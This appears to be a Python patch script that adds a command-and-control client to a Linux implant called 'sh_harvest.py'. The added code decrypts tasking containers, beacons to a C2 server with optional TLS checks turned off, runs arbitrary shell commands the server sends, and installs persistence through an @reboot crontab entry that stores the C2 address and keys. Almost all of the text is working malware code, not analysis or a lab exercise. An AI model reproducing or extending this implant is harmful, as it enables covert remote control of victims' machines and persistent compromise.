# one-shot: add decrypt + beacon + tasking + loop + persistence to linux/sh_harvest.py
import io

A = io.StringIO()
A.write('''

# ---------------------------------------------------------------- c2 client
def aes_gcm_decrypt(key, nonce, body, tag, aad):
    """AES-256-GCM decrypt; mirrors aes_gcm_encrypt's backend selection."""
    if _imported_cryptography():
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(nonce, body + tag, aad)
    evp = _libcrypto()
    ctx = evp.EVP_CIPHER_CTX_new()
    try:
        assert evp.EVP_DecryptInit_ex(ctx, evp.EVP_aes_256_gcm(), None, None, None) == 1
        evp.EVP_CIPHER_CTX_ctrl(ctx, 0x9, 16, None)          # EVP_CTRL_GCM_SET_IVLEN
        assert evp.EVP_DecryptInit_ex(ctx, None, None, key, nonce) == 1
        if aad:
            assert evp.EVP_DecryptUpdate(ctx, None, ctypes.c_int(0), aad, len(aad)) == 1
        out = ctypes.create_string_buffer(len(body) + 16)
        n1 = ctypes.c_int(0)
        assert evp.EVP_DecryptUpdate(ctx, out, ctypes.byref(n1), body, len(body)) == 1
        if evp.EVP_CIPHER_CTX_ctrl(ctx, 0x10, 16, tag) != 1:  # SET_TAG
            raise ValueError("GCM tag verify failed")
        n2 = ctypes.c_int(0)
        if evp.EVP_DecryptFinal_ex(ctx, ctypes.byref(out, n1.value), ctypes.byref(n2)) != 1:
            raise ValueError("GCM final failed")
        return out.raw[:n1.value + n2.value]
    finally:
        evp.EVP_CIPHER_CTX_free(ctx)


def unpack_container(blob, psk):
    """SHV1 -> (manifest dict, {part_name: bytes}). Mirrors build_container."""
    import hashlib, hmac as _hmac
    if blob[:4] != MAGIC:
        raise ValueError("bad magic")
    ver = int.from_bytes(blob[4:6], "big")
    if ver != VERSION:
        raise ValueError("bad version")
    salt, nonce = blob[6:22], blob[22:34]
    ct_len = int.from_bytes(blob[34:42], "big")
    body, tag = blob[42:42 + ct_len], blob[42 + ct_len:42 + ct_len + 16]
    key = hkdf_sha256(psk.encode(), salt, KDF_INFO, 32)
    pt = aes_gcm_decrypt(key, nonce, body, tag, blob[:6])
    mlen = int.from_bytes(pt[:4], "big")
    manifest = json.loads(pt[4:4 + mlen].decode())
    blobd = pt[4 + mlen:]
    parts = {}
    for p in manifest.get("parts", []):
        parts[p["name"]] = blobd[p["off"]:p["off"] + p["len"]]
    return manifest, parts


def http_get(url, ua, pin="", auth=""):
    """GET returning body bytes on 200, None otherwise (204 = no task)."""
    import urllib.request, ssl
    ctx = ssl.create_default_context()
    if pin.startswith("cert:"):
        raise ValueError("cert pinning for beacon requires cryptography backend")
    elif pin == "any":
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"User-Agent": ua})
    if auth:
        req.add_header("X-SH-Auth", auth)
    try:
        with urllib.request.urlopen(req, timeout=20, context=ctx) as r:
            if r.status != 200:
                return None
            return r.read()
    except urllib.error.HTTPError as e:
        if e.code == 204:
            return None
        log("beacon HTTP %d", e.code)
        return None
    except Exception as e:
        log("beacon failed: %s", e)
        return None


def run_task_exec(cmd):
    """Hidden shell command for tasked exec; output capped at 4 MB."""
    import subprocess
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, timeout=60)
        out = (r.stdout or b"") + ((b"\\n[stderr]\\n" + r.stderr) if r.stderr else b"")
        return out[:4 * 1024 * 1024]
    except Exception as e:
        return ("exec-fail: %s" % e).encode()


def persist_state(name=".shsvc"):
    """Report + install user-level persistence via @reboot crontab."""
    import shutil, subprocess
    src = globals().get("__file__")
    line = ""
    try:
        out = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        for ln in (out.stdout or "").splitlines():
            if name in ln:
                line = ln
    except Exception:
        pass
    return line


def persist_install(args, name=".shsvc"):
    """Stage this script to ~/.local/share and add an @reboot crontab entry.
    Only possible when running from a real file (not curl|exec delivery)."""
    import shutil, subprocess, stat
    src = globals().get("__file__")
    if not src or not os.path.isfile(src):
        return "persist: no source file (memory-delivered) -- pass --self-url"
    dst_dir = os.path.join(os.path.expanduser("~"), ".local", "share")
    os.makedirs(dst_dir, exist_ok=True)
    dst = os.path.join(dst_dir, name + ".py")
    shutil.copy2(src, dst)
    os.chmod(dst, 0o700)
    loop = args.loop or 300
    entry = "@reboot /usr/bin/env python3 %s --loop %d --jitter %d --c2 %s" % (
        dst, loop, args.jitter or 60, args.c2)
    if args.psk:
        entry += " --psk '%s'" % args.psk.replace("'", "")
    if args.auth:
        entry += " --auth '%s'" % args.auth.replace("'", "")
    try:
        cur = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout or ""
        if name not in cur:
            subprocess.run(["crontab", "-"], input=cur + entry + "\\n", text=True, check=True)
    except Exception as e:
        return "persist: crontab failed (%s); staged at %s" % (e, dst)
    return "persist: crontab @reboot -> %s" % dst
''')

src = open("linux/sh_harvest.py", encoding="utf-8").read()
anchor = "\n\n# ---------------------------------------------------------------- main"
assert anchor in src
src = src.replace(anchor, A.getvalue() + anchor, 1)
open("linux/sh_harvest.py", "w", encoding="utf-8").write(src)
print("c2 client added")
